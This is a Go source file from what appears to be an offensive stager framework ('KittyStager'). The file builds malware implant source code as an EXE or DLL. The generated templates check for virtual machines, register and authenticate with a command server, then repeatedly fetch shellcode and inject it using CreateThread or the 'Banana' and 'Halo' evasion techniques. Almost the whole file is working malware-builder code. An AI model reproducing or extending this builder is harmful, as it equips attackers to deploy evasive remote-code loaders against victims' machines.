package builder

import (
	"fmt"
	"os"
)

type Malware struct {
	execType    string
	injection   string
	obfuscation bool
}

var (
	mainCode = `
	malware.VmCheck()
	config := malware.NewConfig("","","","","","",0,0)
	err := config.UnmarshallConfig([]byte(t))
	if err != nil {
		return
	}
	for {
		name := malware.NewName(4)
		config.SetName(name)
		// check connection
		malware.CheckConnection(*config)
		password := malware.NewPassword(10)
		// opaque reg
		err := malware.DoPwreg(name, password, *config)
		if err != nil {
			fmt.Println(err)
			return
		}
		// opaque auth
		key, err := malware.DoAuth(name, password, *config)
		if err != nil {
			fmt.Println(err)
			return
		}
		//get request
		config.SetName(name)
		// Be able to inject multiple payloads
		for {
			shellcode := malware.Work(*config, key, name)
			if shellcode == nil {
				break
			}
			`
	dllCode = `
package main

import "C"
import (
	"KittyStager/kitten/malware"
	_ "embed"
	"fmt"
)

//go:embed conf.txt
var t string

func main() {
}

//export Init
func Init() {
`
	exeCode = `
package main

import (
	"KittyStager/kitten/malware"
	_ "embed"
	"fmt"
)

//go:embed conf.txt
var t string

func main() {
`
	createThread = `malware.CreateThread(shellcode)
		}
	}
}
`
	banana = `malware.Banana(shellcode)
		}
	}
}`
	halo = `malware.Halo(shellcode)
		}
	}
}`
)

func NewMalware(execType, injection string, obfuscation bool) *Malware {
	return &Malware{
		execType:    execType,
		injection:   injection,
		obfuscation: obfuscation,
	}
}

func (malware *Malware) Build(path string) {
	var data string
	switch malware.execType {
	case "exe":
		data = exeCode + mainCode
	case "dll":
		data = dllCode + mainCode
	}
	switch malware.injection {
	case "createThread":
		data = data + createThread
	case "banana":
		data = data + banana
	case "halo":
		data = data + halo
	}
	err := os.WriteFile(path, []byte(data), 0777)
	if err != nil {
		fmt.Println("[!] Error:", err)
	}

}
